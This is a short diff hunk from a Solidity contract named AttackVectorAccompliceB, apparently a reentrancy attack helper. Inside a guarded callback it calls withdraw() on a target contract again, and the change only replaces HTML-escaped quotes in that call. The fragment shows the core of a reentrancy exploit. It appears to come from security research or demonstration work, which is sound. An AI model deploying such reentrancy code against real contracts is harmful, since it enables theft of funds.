@@ -58,7 +58,7 @@ contract AttackVectorAccompliceB {
         if (!safety_mode_on) {
             if (in_count == 0) {
                 in_count = 1;
-                _TWIcontract.call(bytes4(keccak256(&quot;withdraw()&quot;)));
+                _TWIcontract.call(bytes4(keccak256("withdraw()")));
             }
             else {
                 in_count = 0; // reset
